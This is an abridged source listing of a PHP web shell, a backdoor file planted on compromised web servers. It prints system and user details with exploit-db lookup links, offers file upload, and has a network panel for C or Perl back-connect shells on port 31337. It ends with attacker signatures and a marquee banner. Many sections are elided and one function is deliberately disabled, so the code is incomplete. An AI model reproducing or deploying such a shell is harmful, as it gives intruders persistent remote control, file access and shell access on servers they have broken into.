<?php 
$auth_pass = "456b7016a916a4b178dd72b947c152b7";
$color = "#df5";
...
function printHeader()
{
  ...
  echo '</title>
<style>
    body {background-color:#403e40;color:#fff;}
  ...
  echo ' !important; }
    ...
    h1            { border:1px solid ';
  echo $color;
  echo ';padding: 2px 5px;font: 14pt Verdana;margin:0px; }
    div.content    { padding: 5px;margin-left:5px;}
    a            { text-decoration:none; }
    a:hover        { background:#ff0000; }
    .ml1        { border:1px solid #444;padding:5px;margin:0;overflow: auto; }
    .bigarea    { width:100%;height:250px; }
    input, textarea, select    { margin:0;color:#ffffff;background-color:#666666;border:1px solid ';
  echo $color;
  echo '; font: 9pt Monospace,"Courier New"; }
    form        { margin:0px; }
...
';
  ...
  $drives = "";
  echo ' <table class="info" cellpadding="3" cellspacing="3" width="100%">
 <tr>
 <td width="1"> <span>UnameUserPhpHddCwd' . ($GLOBALS['os'] == 'win' ? 'Drives' : '') . ' </span> </td> ' .
    ' <td>:  ' . substr(@php_uname(), 0, 120) . ' <a href="http://www.google.com/search?q=' . urlencode(@php_uname()) . '"target = "_blank"> [Google] </a> <a href = "' . $millink . '"target = _blank> [exploit - db] </a> </nobr>:
                    ' . $uid . '(' . $user . ') <span> Group: </span> ' . $gid . '(' . $group . '):
                            ' . @phpversion() . ' <span> Safemode: </span> ' . ($GLOBALS['safe_mode'] ? ' <font color="red"> ON </font> ' : ' <font color = < ? = $color ?><b>OFF</b></font>') . ' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '
...
<input class="toolsInp" type=text name=d><input type=submit value=">>"></form>';
  echo $is_writable;
  echo '</td>
...
<input class="toolsInp" type=file name=f><input type=submit value=">>"></form>';
  echo $is_writable;
  echo '</td>
    </tr>
...
function actionLogout()
{
  ...
  echo 'bye sir 7ta tji by anwaraze!';
}
...
{
  //
  // Added by dx4100. We don't want this to compile :)
  //
  return;
...
function actionNetwork()
{
  ...
  echo '\'> Port: <input type=\'text\' name=\'port\' value=\'31337\'> Using: <select name="using"><option value=\'bcc\'>C</option><option value=\'bcp\'>Perl</option></select> <input type=submit value=">>">
    </form>
...
echo '<div id="cot_tl_fixed"><marquee>&#1610;&#1585;&#1580;&#1609; &#1605;&#1606;&#1603;&#1605; &#1575;&#1582;&#1608;&#1575;&#1606;&#1610; &#1593;&#1583;&#1605; &#1575;&#1582;&#1578;&#1585;&#1575;&#1602; &#1575;&#1604;&#1605;&#1608;&#1575;&#1602;&#1593; &#1575;&#1604;&#1593;&#1585;&#1576;&#1577; &#1575;&#1582;&#1608;&#1603;&#1605; &#1575;&#1606;&#1608;&#1585;- *anwaraze*  - maroc cafe dar badi3a max  - 747crew </marquee></div>
 </marquee></div>';
?>